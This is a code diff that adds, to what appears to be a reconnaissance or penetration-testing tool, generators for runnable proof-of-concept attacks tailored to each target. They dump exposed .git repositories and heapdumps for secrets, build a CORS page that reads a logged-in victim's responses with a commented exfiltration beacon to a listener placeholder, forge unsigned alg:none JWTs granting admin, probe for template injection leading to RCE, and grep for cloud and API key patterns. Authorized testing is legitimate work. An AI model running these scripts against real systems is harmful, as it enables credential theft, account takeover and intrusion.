@@ -192,6 +192,150 @@ _MATCH = [
 _MATCH_C = [(re.compile(p, re.I), k) for p, k in _MATCH]
 
 
+# --- per-finding web PoCs -------------------------------------------------------
+# A tailored, runnable, BENIGN proof for each web finding type, with the target
+# URL filled in. RCE escalations reference the published PoC (run in ROE).
+
+_TLS_PORTS = {443, 8443, 9443, 4443, 10443, 5986}
+
+
+def _url_from_vuln(v) -> str:
+    m = re.search(r"https?://[^\s/]+", getattr(v, "output", "") or "")
+    if m:
+        return m.group(0)
+    port = getattr(v, "port", None)
+    if not port:
+        return f"http://{v.ip}"
+    sch = "https" if port in _TLS_PORTS else "http"
+    hostport = v.ip if port in (80, 443) else f"{v.ip}:{port}"
+    return f"{sch}://{hostport}"
+
+
+def _p_git(u):
+    return ("sh", "#!/bin/sh\n# recce .git PoC - dump the exposed repo, surface its secrets. BENIGN (read-only).\n"
+            "# needs: pipx install git-dumper\n"
+            f"git-dumper \"{u}/.git\" ./recce_git_loot && \\\n"
+            "  grep -rinE 'password|secret|api[_-]?key|token|BEGIN .*PRIVATE KEY' ./recce_git_loot | head\n",
+            "dump the source + secrets from the exposed .git")
+
+
+def _p_cors(u):
+    js = (
+        "<!-- recce CORS PoC - proves the target reflects our Origin + credentials.\n"
+        "     Host this on a server you control; open it in a browser logged into the target. -->\n"
+        "<pre id=o>running...</pre>\n<script>\n"
+        "fetch(%r, {credentials:'include'}).then(r=>r.text()).then(t=>{\n"
+        "  o.textContent = 'Read '+t.length+\" bytes of the victim's AUTHENTICATED response:\\n\\n\"+t.slice(0,500);\n"
+        "  // exfil to your listener: navigator.sendBeacon('http://YOUR-LISTENER/', t);\n"
+        "}).catch(e=>o.textContent='blocked: '+e);\n</script>\n" % u)
+    return ("html", js,
+            "open in a logged-in browser: reads the victim's cross-origin authenticated response")
+
+
+def _p_jwt(u):
+    body = [
+        "#!/usr/bin/env python3",
+        "# recce JWT alg:none PoC - forge an unsigned token with a tampered claim. BENIGN.",
+        "import base64, json, sys",
+        "URL = " + repr(u),
+        "tok = sys.argv[1] if len(sys.argv) > 1 else 'PASTE_JWT_HERE'",
+        "def b64u(b): return base64.urlsafe_b64encode(b).rstrip(b'=').decode()",
+        "h, p, _ = tok.split('.')",
+        "claims = json.loads(base64.urlsafe_b64decode(p + '=' * (-len(p) % 4)))",
+        "claims['admin'] = True            # tamper a claim as the proof",
+        'forged = b64u(b\'{"alg":"none","typ":"JWT"}\') + \'.\' + b64u(json.dumps(claims).encode()) + \'.\'',
+        "print('forged token:', forged)",
+        'print(\'replay: curl -H "Authorization: Bearer \' + forged + \'" \' + URL)',
+    ]
+    return ("py", "\n".join(body) + "\n",
+            "forge an alg:none token with a tampered claim, then replay it")
+
+
+def _p_ssti(u):
+    return ("sh", "#!/bin/sh\n# recce SSTI PoC - confirm + identify the template engine (benign math). \n"
+            f'U="{u}"\n'
+            "enc(){ python3 -c 'import urllib.parse,sys;print(urllib.parse.quote(sys.argv[1]))' \"$1\"; }\n"
+            "for p in 'rc{{7*7}}' 'rc${7*7}' 'rc#{7*7}' 'rc<%=7*7%>' 'rc{{7*\"7\"}}'; do\n"
+            "  printf '%-14s -> ' \"$p\"; curl -sk \"$U?rc=$(enc \"$p\")\" | grep -oE 'rc[0-9]+' | head -1\n"
+            "done\n"
+            "# rc49 -> arithmetic engine (Jinja2/Twig/Freemarker); rc7777777 -> Jinja2/Twig string.\n"
+            "# escalate to RCE with:  tplmap -u \"$U?rc=*\"   (within ROE)\n",
+            "identify the template engine; escalate with tplmap in ROE")
+
+
+def _p_graphql(u):
+    return ("sh", "#!/bin/sh\n# recce GraphQL PoC - dump the schema via introspection. BENIGN.\n"
+            f'U="{u}"\n'
+            "curl -sk -X POST -H 'Content-Type: application/json' \\\n"
+            "  -d '{\"query\":\"query{__schema{types{name fields{name}}}}\"}' \"$U/graphql\" \\\n"
+            "  | python3 -m json.tool | head -80\n",
+            "dump the full GraphQL schema (types + fields)")
+
+
+def _p_heapdump(u):
+    return ("sh", "#!/bin/sh\n# recce Actuator heapdump PoC - download + grep memory for secrets. BENIGN.\n"
+            f"curl -sk \"{u}/actuator/heapdump\" -o recce_heap.hprof && \\\n"
+            "  strings recce_heap.hprof | grep -iE 'password|secret|token|jdbc:|api[_-]?key' | sort -u | head -40\n",
+            "download the heapdump and surface in-memory secrets")
+
+
+def _p_methods(u):
+    return ("sh", "#!/bin/sh\n# recce HTTP PUT PoC - prove a write primitive (benign marker). Remove it after.\n"
+            f'U="{u}"\n'
+            "curl -sk -X PUT \"$U/recce_poc.txt\" -d 'recce_poc' -o /dev/null -w '%{http_code}\\n'\n"
+            "curl -sk \"$U/recce_poc.txt\"; echo\n"
+            "curl -sk -X DELETE \"$U/recce_poc.txt\" -o /dev/null   # cleanup\n",
+            "PUT a marker file and read it back (then DELETE it)")
+
+
+def _p_download(u):
+    return ("sh", "#!/bin/sh\n# recce exposed-file PoC - fetch the secret-bearing file. BENIGN (read-only).\n"
+            f'U="{u}"\n'
+            'echo "$U"; curl -sk "$U" | head -40\n',
+            "fetch the exposed file and show its (secret) contents")
+
+
+def _p_js_secret(u):
+    return ("sh", "#!/bin/sh\n# recce JS-secret PoC - pull the key out of the client-side script. BENIGN.\n"
+            f"curl -sk \"{u}\" | grep -oE 'AIza[0-9A-Za-z_-]{{35}}|AKIA[0-9A-Z]{{16}}|sk_live_[0-9A-Za-z]+|"
+            "gh[pousr]_[0-9A-Za-z]{36}|-----BEGIN [A-Z ]*PRIVATE KEY-----' | sort -u\n",
+            "extract the hardcoded key from the JS file")
+
+
+_WEB_POC = {
+    "web-git": _p_git, "web-gitconfig": _p_git,
+    "web-cors": _p_cors, "web-jwt": _p_jwt, "web-ssti": _p_ssti,
+    "web-graphql": _p_graphql, "web-actuator-heapdump": _p_heapdump,
+    "web-methods": _p_methods, "web-js-secret": _p_js_secret,
+    "web-dotenv": _p_download, "web-aws": _p_download, "web-htpasswd": _p_download,
+    "web-backup": _p_download, "web-actuator-env": _p_download,
+    "web-actuator-configprops": _p_download, "web-metrics": _p_download,
+    "web-serverstatus": _p_download, "web-serverinfo": _p_download,
+    "web-phpinfo": _p_download,
+}
+
+
+def web_pocs_for_host(host) -> list[tuple]:
+    """Per-web-finding PoC artifacts for a host: [(filename, content, note)],
+    deduped by (script_id, port). Tailored to each finding, URL filled in."""
+    out: list[tuple] = []
+    seen: set[tuple] = set()
+    for v in getattr(host, "vulns", []) or []:
+        if getattr(v, "source", "") != "web":
+            continue
+        builder = _WEB_POC.get(v.script_id)
+        if not builder:
+            continue
+        key = (v.script_id, v.port)
+        if key in seen:
+            continue
+        seen.add(key)
+        ext, content, note = builder(_url_from_vuln(v))
+        fname = f"poc_{v.script_id}_{host.ip}_{v.port or 0}.{ext}"
+        out.append((fname, content, note))
+    return out
+
+
 def recipe_key_for(text: str) -> str | None:
     for rx, k in _MATCH_C:
         if rx.search(text or ""):
